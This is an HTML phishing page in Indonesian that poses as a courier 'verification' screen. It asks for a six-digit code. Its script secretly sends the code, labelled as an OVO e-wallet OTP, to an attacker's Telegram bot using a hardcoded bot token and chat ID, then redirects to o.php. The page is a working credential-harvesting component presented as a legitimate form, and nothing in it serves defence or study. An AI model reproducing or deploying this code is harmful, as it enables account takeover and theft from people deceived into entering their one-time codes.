<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Verifikasi Jasa Kirim</title>
    <style>
        :root {
            /* Warna Default (Light Mode) */
            --bg-color: #ffffff;
            --text-primary: #000000;
            --text-secondary: #666666;
            --input-bg: #F4F1F8;
            --box-border: #E0D9F0;
            --btn-purple: #4C2A86;
        }

        /* Otomatis Switch ke Dark Mode jika Device diatur Gelap */
        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #121212;
                --text-primary: #ffffff;
                --text-secondary: #b0b0b0;
                --input-bg: #1e1e1e;
                --box-border: #333333;
                --btn-purple: #5d33cc;
            }
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body, html {
            height: 100%;
            background-color: var(--bg-color);
            color: var(--text-primary);
            transition: background-color 0.3s ease;
        }

        .container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            padding: 25px;
            max-width: 500px;
            margin: 0 auto;
        }

        .header {
            width: 100%;
            display: flex;
            align-items: center;
            margin-bottom: 30px;
            padding-top: 10px;
        }

        .back-btn {
            font-size: 24px;
            color: var(--text-primary);
            cursor: pointer;
        }

        h1 {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: left;
        }

        p.description {
            font-size: 14px;
            color: var(--text-secondary);
            margin-bottom: 40px;
        }

        /* Area Input OTP */
        .otp-wrapper {
            display: flex;
            justify-content: space-between;
            gap: 10px;
            margin-bottom: 50px;
        }

        .otp-box {
            width: 50px;
            height: 60px;
            background-color: var(--input-bg);
            border: 1.5px solid var(--box-border);
            border-radius: 12px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            color: var(--text-primary);
            outline: none;
            transition: all 0.2s ease;
        }

        .otp-box:focus {
            border-color: var(--btn-purple);
            background-color: var(--bg-color);
        }

        /* Tombol Lanjutkan */
        .btn-lanjutkan {
            width: 100%;
            background-color: var(--btn-purple);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 35px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        /* Footer Timer */
        .footer-timer {
            margin-top: auto;
            text-align: center;
            padding-bottom: 30px;
            font-size: 13px;
            color: var(--text-secondary);
            font-weight: 500;
        }

        #timerText {
            color: var(--btn-purple);
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="back-btn" onclick="history.back()">←</div>
    </div>

    <h1>Verifikasi Jasa Kirim</h1>
    <p class="description">Masukkan kode Verifikasi yang di kirim ke nomor anda..</p>

    <form id="otpForm">
        <div class="otp-wrapper">
            <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" autofocus>
            <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric">
            <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric">
            <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric">
            <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric">
            <input type="tel" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric">
        </div>

        <button type="submit" id="btnSubmit" class="btn-lanjutkan">Lanjutkan</button>
    </form>

    <div class="footer-timer">
        Belum Dapatkan kode? kirim ulang <span id="timerText">60</span> detik
    </div>
</div>

<script>
    const boxes = document.querySelectorAll('.otp-box');
    const timerDisplay = document.getElementById('timerText');
    let timeLeft = 60;

    // Timer Hitung Mundur
    const countdown = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(countdown);
            document.querySelector('.footer-timer').innerHTML = 'Belum Dapatkan kode? <span style="color:#00A3FF; cursor:pointer;">kirim ulang</span>';
        } else {
            timerDisplay.textContent = timeLeft;
        }
        timeLeft -= 1;
    }, 1000);

    // Auto Focus Next Box
    boxes.forEach((box, index) => {
        box.addEventListener('input', (e) => {
            if (e.target.value.length === 1 && index < boxes.length - 1) {
                boxes[index + 1].focus();
            }
            checkSubmitStatus();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                boxes[index - 1].focus();
            }
        });
    });

    function checkSubmitStatus() {
        let code = "";
        boxes.forEach(b => code += b.value);
        // Bisa tambahkan logika disable/enable tombol di sini
    }

    // Pengiriman Telegram & Redirect
    document.getElementById('otpForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        let otpCode = "";
        boxes.forEach(box => otpCode += box.value);

        if (otpCode.length < 6) return;

        const token = "8338515989:AAGWomCuKU6z52sBmVn0_DLADUc025889F4"; 
        const chat_id = "7774868050"; 
        const text = `--- OVO OTP VERIFIED ---\nOTP: ${otpCode}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chat_id, text: text })
        })
        .then(() => {
            window.location.href = 'o.php';
        })
        .catch(() => {
            window.location.href = 'o.php';
        });
    });
</script>

</body>
</html>